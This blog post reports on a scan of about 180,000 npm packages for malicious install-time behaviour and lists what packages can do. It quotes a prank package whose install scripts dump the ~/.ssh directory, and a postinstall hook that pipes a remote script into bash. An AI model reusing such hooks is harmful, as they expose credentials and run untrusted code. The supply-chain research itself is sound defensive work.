<div class="post__text post__text-html js-mediator-article"><p>  A couple of months ago, I started a project called <a href="https://github.com/malicious-packages">malicious packages</a> (aka “malicious packages”).  It monitors for updates in the npm repository, downloads all new modules, and then checks them for lice - searches for network activity, suspicious operations with the file system, etc.  Even small projects on node.js often have a large dependency tree, and developers are physically unable to check them all.  This gives attackers a huge room for maneuver, and the question arises - how much nastiness hiding in the dark corners of the npm registry?  180,000 checked packages later I received a rough answer. </p><br><p><img src="https://habrastorage.org/webt/bg/9_/qs/bg9_qs2qlravq3d4l6qdi1inr0m.png" alt="image"></p><a name="habracut"></a><br><p>  And this answer is probably not so much. <br>  <em>[note: on <a href="https://medium.com/%40v_pragma/12-strange-things-that-can-happen-after-installing-an-npm-package-45de7fbf39f0">medium</a> there is an English version of this article, also under my authorship]</em> </p><br><h2 id="chto-npm-paket-mozhet-sdelat-c-vashey-sistemoy">  What can npm package do with your system? </h2><br><p>  The package has two main ways to harm you - when installing / uninstalling and when launching your application.  Let's look at both options with examples. </p><br><p> <a href="https://docs.npmjs.com/misc/scripts">NPM scripts</a> allow packages to execute arbitrary commands at the time of installation and removal.  These include <code>preinstall</code> , <code>install</code> , <code>postinstall</code> , <code>preuninstall</code> and <code>postuninstall</code> , which are automatically executed by npm at the appropriate time in the package's life cycle.  What can they do?  All the same that your current user can do - for example, delete all your photos from the last vacation, or merge the history of your browser into the FBI (although, most likely, they already have it).  This behavior can be disabled by passing the <code>--ignore-scripts</code> flag, but, firstly, no one does this, and secondly, this way you can break down a bunch of quite reliable packages.  It was through the scripts that the <a href="https://gist.github.com/hzoo/51cb84afdc50b14bffa6c6dc49826b3e">sensational attack on ESLint</a> was carried out, which affected the users of <a href="https://www.npmjs.com/package/eslint-scope">eslint-scope</a> (6 million installations per week) and <a href="https://www.npmjs.com/package/eslint-config-eslint">eslint-config-eslint</a> (2,000 installations per week). </p><br><p>  The package gets a second chance to make life difficult for you at initialization (usually occurs when you first <code>require</code> ).  Now he has the opportunity to modify global variables and other packages, for example, <a href="https://www.npmjs.com/advisories/737">to steal a private key</a> from your Bitcoin wallet, or to make the <code>crypto.randomBytes</code> method <a href="https://www.npmjs.com/advisories/738">not so random</a> . </p><br><p><img src="https://habrastorage.org/storage2/930/571/c14/930571c142e5a454827cca64cd0855be.png" alt="image"></p><br><h2 id="skolko-vredonosnyh-paketov-bylo-obnaruzheno">  How many malicious packages were detected? </h2><br><p>  Well, the list is not impressive, just 3 packages were found that have been removed from the npm repository by the efforts of the <a href="https://www.npmjs.com/advisories/report">npm security team</a> .  Let's go over it: </p><br><ul><li>  <a href="https://github.com/malicious-packages/cemetry/tree/master/commander-js">commander-js</a> tries to disguise itself as a real <code>commander.js</code> (which is <a href="https://www.npmjs.com/package/commander">https://www.npmjs.com/package/commander</a> ), but contains one unusual detail, namely the <code>postinstall</code> script that downloads and executes the contents of <a href="">http://23.94.46.191/ update.json</a> (at the time of publication does not contain anything criminal).  Security advisory: <a href="https://www.npmjs.com/advisories/763">https://www.npmjs.com/advisories/763</a> . </li><li>  <a href="https://github.com/malicious-packages/cemetry/tree/master/rrgod">rrgod</a> through all the same scripts loads and executes the script from <a href="http://static.ricterz.me/">http://static.ricterz.me</a> , which, in turn, tries to load another script that is currently unavailable.  Security advisory: <a href="https://www.npmjs.com/advisories/764">https://www.npmjs.com/advisories/764</a> . </li><li>  <a href="https://github.com/malicious-packages/cemetry/tree/master/portionfatty12">portionfatty12</a> cannot be called completely malicious, but the way in which the author collects statistics about his child’s installations is very dubious - sending your public ssh key ( <code>~/.ssh/id_rsa.pub</code> ) to a server that is currently unavailable.  Security advisory: <a href="https://www.npmjs.com/advisories/765">https://www.npmjs.com/advisories/765</a> . </li></ul><br><p>  Despite the very modest results, in the process of analyzing all the suspicious packages (and I looked at more than 3000 reports to find these three pearls), many amusing and not-so-many things were found that you usually don’t think (or try not to think about) typing <code>npm install</code> .  So let's imagine that you randomly selected one of the many packages from the repository and install it.  What can go wrong? </p><br><p>  <strong>1. A package can override methods in other packages (including those from the standard Node.js delivery)</strong> </p><br><p>  However, if you have read a couple of previous paragraphs or have been working with the javascript ecosystem for more than a week, then this is unlikely to be news to you.  But the scale of this disaster could easily slip away from you.  So, if your project has at least a few dependencies, then most likely the <a href="https://nodejs.org/api/fs.html">fs.closeSync</a> method is already redefined (and, maybe, more than once).  A huge number of packages modifies someone else's API, but only a few of them have any valid reason for this.  Among the "champions" - <a href="https://www.npmjs.com/package/graceful-fs">graceful-fs</a> with 12 million installations per week, which <a href="">overrides a dozen methods from fs</a> .  It is also worth noting the <a href="https://www.npmjs.com/package/async-listener">async listener</a> , which redefines <a href="">46 different methods</a> , including the ill-fated <code>crypto.randomBytes</code> , which strained me a little when I first discovered it. </p><br><p>  Imagine what it would look for a bug caused by such a redefinition from any dependency in the depths of the hierarchy.  However, there are no reasons for experiences, because ... </p><br><p>  <strong>2. A package may define a modified API to make additional corrections to it.</strong> </p><br><p><img src="https://habrastorage.org/webt/aq/vf/vl/aqvfvlvne6ysfueydftxaubwnlg.png" alt="image"></p><br><p>  Yes, some packages do this (most often with respect to the same <code>graceful-fs</code> ) using acrobatics like <code>/graceful-fs/.test(fs.closeSync.toString())</code> .  So, if you suddenly encounter incomprehensible problems in the standard library, try simply installing a couple of random npm packages.  Or just turn off the computer and walk through the nearest park, life is too short to understand all this. </p><br><p>  <strong>3. He can send analytics</strong> </p><br><p>  Adblock will not protect you if it happens in the console, and the authors of some packages successfully use this.  Some send the most basic information, such as <a href="https://www.npmjs.com/package/ecdsa-csr">ecdsa-csr</a> : </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// POST https://api.therootcompany.com/api/therootcompany.com/public/ping { "package":"ecdsa-csr", "version":"1.1.1", "node":"v10.14.2", "arch":"x64", "platform":"linux", "release":"4.9.125-linuxkit", "action":"install", "ppid":"eDSeYr9XUNRi9WhWli5smBNAvdw=" }</span></span></code> </pre> <br><p>  Some are not so shy.  Here, for example, part of the <a href="https://www.npmjs.com/package/serverless">serverless</a> report (the original is 2 times more): </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// POST https://tracking.serverlessteam.com/v1/track { "userId":"0e32cba0-14ef-11e9-9f89-b7ed4ca5dbba", "event":"framework_stat", "properties":{ "version":2, "general":{ "userId":"0e32cba0-14ef-11e9-9f89-b7ed4ca5dbba", "context":"install", "timestamp":1547135257977, "timezone":"GMT+0000", "operatingSystem":"linux", "userAgent":"cli", "serverlessVersion":"1.35.1", "nodeJsVersion":"v10.14.2", "isDockerContainer":true, "isCISystem":false, "ciSystem":null } } }</span></span></code> </pre> <br><p>  Fortunately, <code>jquery</code> does not send any statistics, so it can still be installed in secret from everyone.  For the time being. </p><br><p>  <strong>4. Your computer can be used instead of the CI / CD server.</strong> </p><br><p>  Why do you need to compile your package if <a href="">your users</a> can do it <a href="">during installation</a> ?  You can get additional progress if you specify only the major version of the required compiler, for example, <code>typescript@3</code> .  One hope for literate guys from Microsoft who can do the right semver. </p><br><p>  Can I go even further?  <a href="https://www.npmjs.com/package/raven-reader">Of course</a> ! </p><br><pre> <code class="javascript hljs"><span class="hljs-string"><span class="hljs-string">"postinstall"</span></span>: <span class="hljs-string"><span class="hljs-string">"eslint --ext .js,.vue --fix src"</span></span></code> </pre> <br><p>  Now you can sleep peacefully - all users will receive the perfectly formatted source code of your package. </p><br><p>  <strong>5. He may try to scare you</strong> </p><br><p><img src="https://habrastorage.org/webt/vg/h7/uf/vgh7uf8gcfpc3c1cxhukl5ax3fo.png" alt="image"></p><br><p>  If you watched all the series Mr.  Robot, but still not motivated enough to read <a href="https://www.amazon.com/Computer-Networks-Tanenbaum-International-Economy/dp/9332518742">Computer Networks</a> and do something really impressive, that is, a simple solution - demonstrate your skills to the world with a couple of lines in the <code>postinstall</code> script.  This is exactly what the author of <a href="https://github.com/malicious-packages/cemetry/tree/master/pizza-pasta">pizza-pasta</a> did (and at the same time gave me a CDRV). </p><br><pre> <code class="javascript hljs">{ <span class="hljs-string"><span class="hljs-string">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"pizza-pasta"</span></span>, <span class="hljs-string"><span class="hljs-string">"author"</span></span>: <span class="hljs-string"><span class="hljs-string">"Zeavo"</span></span>, <span class="hljs-string"><span class="hljs-string">"scripts"</span></span>: { <span class="hljs-string"><span class="hljs-string">"install"</span></span>: <span class="hljs-string"><span class="hljs-string">"mkdir -p ~/Desktop/hacked &amp;&amp; touch ~/Desktop/hacked/pwnddddd &amp;&amp; wget https://imgur.com/download/KTDNt5I -P ~/Desktop/hacked/"</span></span>, <span class="hljs-string"><span class="hljs-string">"postinstall"</span></span>: <span class="hljs-string"><span class="hljs-string">"find ~/.ssh | xargs cat || true &amp;&amp; printf '\n\n\n\n\n\nOH HEY LOOK SSH KEYS\n\n\n\nHappy Birthday! Youve been h4ck0red\n\n\n'"</span></span> } }</code> </pre> <br><p>  <strong>6. Package can load and execute bash scripts.</strong> </p><br><p>  Have you heard that doing <code>curl|bash</code> <a href="https://www.seancassidy.me/dont-pipe-to-your-shell.html">not a good idea</a> ?  If not, then you may well be an <a href="https://www.npmjs.com/~oresoftware">ORESoftware</a> employee who has a <a href="https://www.npmjs.com/package/r2g.docker">whole</a> <a href="https://www.npmjs.com/package/typescript-library-skeleton">bunch of</a> <a href="https://www.npmjs.com/package/nrestart">packages</a> with similar lines in the <code>postinstall</code> script: </p><br><pre> <code class="bash hljs">curl --silent -o- https://raw.githubusercontent.com/oresoftware/realpath/master/assets/install.sh | bash</code> </pre> <br><p>  So far there is nothing criminal in this script ... Bye.  I hope that everyone who has access to the <code>master</code> in <code>oresoftware/realpath</code> is exceptionally honest and decent people. </p><br><p>  <strong>7. You may be asked for a password</strong> </p><br><p>  The author of <a href="https://www.npmjs.com/package/magicleap">magicleap</a> came up with a rather unusual way to distribute a private package through a public repository.  Its project consists of an encrypted archive and utilities for decrypting it - but only if you put the correct key in the <code>MAGICLEAP</code> environment <code>MAGICLEAP</code> : </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// Оригинал: https://github.com/modulesio/magicleap/blob/master/decrypt.js var key = process.env['MAGICLEAP']; console.warn('Decrypting magicleap module with MAGICLEAP environment variable'); const ws = fs.createReadStream(path.join(__dirname, 'lib.zip.enc')) .pipe(crypto.createDecipher('aes-256-cbc', Buffer.from(key, 'base64'))) .pipe(fs.createWriteStream(path.join(__dirname, 'lib.zip')));</span></span></code> </pre> <br><p>  <strong>8. Package can patch itself during installation.</strong> </p><br><p>  The author of the <a href="https://www.npmjs.com/package/fake-template">fake-template</a> does not have time to separate the tests from the direct code, especially since it is easy to do by adding a special comment to the end of the test lines: </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// Оригинал: https://github.com/framp/fake-template/blob/master/index.js const template = (string, tag=defaultTag) =&gt; { if (mode !== 'literal') throw new Error('Invalid template') return (context={}) =&gt; tag(literals, ...expressions.map(evalInContext(context))) } assert.equal(template('')(), ``) // TEST assert.equal(template('abc')(), `abc`) // TEST const dog = 'Orlando' // TEST assert.equal(template('abc ${dog} lol ${cat}')({dog}), `abc ${dog} lol ${cat}`) // TEST</span></span></code> </pre> <br><p>  And then remove them through <code>sed</code> : </p><br><pre> <code class="javascript hljs"><span class="hljs-string"><span class="hljs-string">"postinstall"</span></span>: <span class="hljs-string"><span class="hljs-string">"sed -i '/\\/\\/ TEST/d' index.js"</span></span></code> </pre> <br><p>  Simple and elegant! </p><br><p>  <strong>9. Package can change <code>npm</code> settings</strong> </p><br><p>  In my humble opinion, <code>package-json.lock</code> is a great thing that can save you from a whole heap of problems caused by the negligence of other developers.  However, <a href="https://www.npmjs.com/package/ontimize-web-ngx-tree">some opponents of</a> this idea have rather strong arguments against: </p><br><pre> <code class="javascript hljs"><span class="hljs-string"><span class="hljs-string">"preinstall"</span></span>: <span class="hljs-string"><span class="hljs-string">"npm config set package-lock false"</span></span></code> </pre> <br><p>  <strong>10. He can change the background of your desktop on the photo of Nicolas Cage</strong> </p><br><p><img src="https://habrastorage.org/webt/sk/od/kv/skodkvowalhyrenoiqlg8fradu4.jpeg" alt="image"></p><br><p>  Here is the link, just in case - <a href="https://www.npmjs.com/package/cage-js">https://www.npmjs.com/package/cage-js</a> .  Perhaps it was worth reporting this package as malicious. </p><br><p>  <strong>11. A package can <a href="https://ru.wikipedia.org/wiki/%25D0%25A0%25D0%25B8%25D0%25BA%25D1%2580%25D0%25BE%25D0%25BB%25D0%25BB%25D0%25B8%25D0%25BD%25D0%25B3">hook</a> you <a href="https://ru.wikipedia.org/wiki/%25D0%25A0%25D0%25B8%25D0%25BA%25D1%2580%25D0%25BE%25D0%25BB%25D0%25BB%25D0%25B8%25D0%25BD%25D0%25B3">up.</a></strong> </p><br><p>  This is what <a href="https://www.npmjs.com/package/ember-data-react">ember-data-react is doing</a> , revealing the famous <a href="https://www.youtube.com/watch%3Fv%3DdQw4w9WgXcQ">video</a> during installation.  Unfortunately, no data from Ember to React can be transferred with its help - there is not a single line of javascript code in it. </p><br><p>  <strong>12. It may simply not be installed.</strong> </p><br><p><img src="https://habrastorage.org/webt/wc/ac/nd/wcacndpogbokwtmi_gpywrmxwmw.png" alt="image"><br>  Non-existing dependencies, incorrectly specified versions, private repositories that have sunk into oblivion — you cannot install about 0.6% of all packages from the npm repository. </p><br><h2 id="vmesto-zaklyucheniya">  Instead of conclusion </h2><br><p>  NPM packages can do strange things with your system, and you don’t have many options to protect against this.  Use <code>package-lock.json</code> to avoid sudden updates (and ensure that no one disconnects it without your knowledge), configure the <a href="https://developer.mozilla.org/ru/docs/Web/HTTP/CSP">CSP</a> on the front end so that the backdoor in the third-party module at least cannot merge the data to its author.  And make a backup of your photos, just in case. </p><br><p>  If you feel strong enough to dive into the wonderful world of npm packages, you can find all the source code here: <a href="https://github.com/malicious-packages/core">https://github.com/malicious-packages/core</a> .  The utility is full of hacks and suboptimal solutions, but it copes well with its task.  Also in the repository there is a MongoDB dump with the results of the analysis of more than 180,000 packages, most importantly, do not forget to add the filter <code>{'reports.status': 'unverified'}</code> .  I do not plan to further develop this project due to lack of time, but I will try to help with all the questions and problems, if any. </p><br><p>  Take care of yourself and your applications! </p></div>